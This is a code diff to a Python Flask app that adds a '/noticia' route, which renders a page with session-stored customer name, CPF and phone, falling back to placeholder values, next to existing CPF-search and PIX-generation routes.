@@ -161,6 +161,18 @@ def buscar_cpf():
     app.logger.info("[PROD] Acessando página de busca de CPF: buscar-cpf.html")
     return render_template('buscar-cpf.html')
 
+@app.route('/noticia')
+def noticia():
+    # Get customer data from session, or use default data
+    customer_data = session.get('customer_data', {
+        'nome': 'JOÃO DA SILVA SANTOS',
+        'cpf': '123.456.789-00',
+        'phone': '11999999999'
+    })
+    
+    app.logger.info(f"[PROD] Acessando página de notícia com dados: {customer_data.get('nome', 'N/A')}")
+    return render_template('index.html', customer=customer_data)
+
 @app.route('/generate-pix', methods=['POST'])
 def generate_pix():
     try:
